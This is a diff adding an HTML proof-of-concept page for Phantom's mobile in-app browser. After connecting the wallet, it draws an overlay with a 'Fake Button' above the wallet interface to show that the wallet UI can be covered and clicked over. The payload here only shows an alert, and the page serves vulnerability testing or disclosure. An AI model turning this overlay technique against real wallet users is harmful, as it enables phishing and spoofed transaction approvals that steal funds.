@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Phantom Element Mode Overlay Proof</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      text-align: center;
+      background: #f5f5f5;
+      padding: 2rem;
+    }
+    button {
+      padding: 12px 24px;
+      font-size: 16px;
+      background-color: #9945FF;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+    #status {
+      margin-top: 20px;
+      font-weight: bold;
+    }
+
+    #overlay-proof {
+      display: none;
+      position: fixed;
+      top: 40%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: rgba(255, 0, 0, 0.15);
+      padding: 30px;
+      z-index: 9999;
+      border-radius: 10px;
+    }
+
+    #overlay-proof button {
+      background: #d9534f;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+  <h1>🧪 Phantom Element Mode + Overlay Proof</h1>
+  <p>This test is for Phantom's mobile in-app browser. It proves you can render over Phantom's UI.</p>
+  <button id="connectBtn">Connect Wallet (Element Mode)</button>
+  <p id="status">Wallet not connected.</p>
+
+  <div id="overlay-proof">
+    <p>✅ Overlay Rendered Above Phantom UI</p>
+    <button onclick="alert('Overlay button clicked!')">Fake Button</button>
+  </div>
+
+  <script>
+    const status = document.getElementById('status');
+    const connectBtn = document.getElementById('connectBtn');
+    const overlay = document.getElementById('overlay-proof');
+
+    connectBtn.addEventListener('click', async () => {
+      if (window.solana?.isPhantom) {
+        try {
+          const resp = await window.solana.connect({
+            onlyIfTrusted: false,
+            app: 'iframe'
+          });
+          status.innerText = "✅ Connected: " + resp.publicKey.toString();
+
+          // Delay before showing overlay (let Phantom UI render)
+          setTimeout(() => {
+            overlay.style.display = 'block';
+            console.log("Overlay rendered. If you can click the button, the Phantom UI is DOM-based and unprotected.");
+          }, 1500);
+        } catch (err) {
+          status.innerText = "❌ Connection canceled: " + err.message;
+        }
+      } else {
+        status.innerText = "🚫 Phantom not detected. Use Phantom’s mobile browser.";
+      }
+    });
+  </script>
+</body>
+</html>
